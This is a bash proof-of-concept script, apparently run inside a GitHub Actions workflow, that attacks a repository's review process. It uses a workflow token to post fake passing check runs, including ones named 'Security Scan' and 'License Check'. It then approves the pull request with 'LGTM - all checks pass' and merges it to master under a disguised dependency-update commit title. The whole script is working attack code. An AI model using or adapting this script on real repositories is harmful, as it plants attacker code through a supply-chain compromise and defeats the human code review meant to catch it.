#!/bin/bash
echo "========================================="
echo "  CRITICAL: Full Auto-Merge PoC v4"
echo "  Attacker: treborlab → robertprast/beam"
echo "  Time: $(date -u)"
echo "========================================="

TOKEN="$GH_TOKEN_FOR_DISPATCH"
REPO="$GITHUB_REPOSITORY"
PR_NUMBER=$(jq -r '.number' "$GITHUB_EVENT_PATH")
HEAD_SHA=$(jq -r '.pull_request.head.sha' "$GITHUB_EVENT_PATH")
echo "PR: #$PR_NUMBER  SHA: $HEAD_SHA"

echo ""
echo "=== Step 1: Fake green checks ==="
for check in "PreCommit Python" "PreCommit Java" "PreCommit Go" "Code Coverage" "Security Scan" "License Check"; do
  curl -s -o /dev/null -w "  ✅ $check → %{http_code}\n" \
    -X POST -H "Authorization: token $TOKEN" -H "Accept: application/vnd.github.v3+json" \
    "https://api.github.com/repos/$REPO/check-runs" \
    -d "{\"name\":\"$check\",\"head_sha\":\"$HEAD_SHA\",\"status\":\"completed\",\"conclusion\":\"success\",\"output\":{\"title\":\"Passed\",\"summary\":\"All good\"}}"
done

echo ""
echo "=== Step 2: Approve PR ==="
curl -s -o /dev/null -w "  Approve → %{http_code}\n" \
  -X POST -H "Authorization: token $TOKEN" -H "Accept: application/vnd.github.v3+json" \
  "https://api.github.com/repos/$REPO/pulls/$PR_NUMBER/reviews" \
  -d '{"event":"APPROVE","body":"LGTM - all checks pass"}'

echo ""
echo "=== Step 3: MERGE THE PR ==="
MERGE_RESULT=$(curl -s -w "\n%{http_code}" \
  -X PUT -H "Authorization: token $TOKEN" -H "Accept: application/vnd.github.v3+json" \
  "https://api.github.com/repos/$REPO/pulls/$PR_NUMBER/merge" \
  -d '{"merge_method":"merge","commit_title":"chore: update python SDK dependency (#'"$PR_NUMBER"')"}')

MERGE_HTTP=$(echo "$MERGE_RESULT" | tail -1)
MERGE_BODY=$(echo "$MERGE_RESULT" | sed '$d')
echo "  Merge HTTP: $MERGE_HTTP"
echo "  Response: $(echo "$MERGE_BODY" | jq -r '.message // .sha' 2>/dev/null)"

if [ "$MERGE_HTTP" = "200" ]; then
  echo ""
  echo "========================================="
  echo "  🚨 PR MERGED TO MASTER 🚨"
  echo "  Attacker code is now on master"
  echo "  Zero human interaction"
  echo "========================================="
elif [ "$MERGE_HTTP" = "405" ]; then
  echo "  Merge blocked (405) — may need contents:write"
  echo "  But PR is approved + green — maintainer just clicks merge"
fi
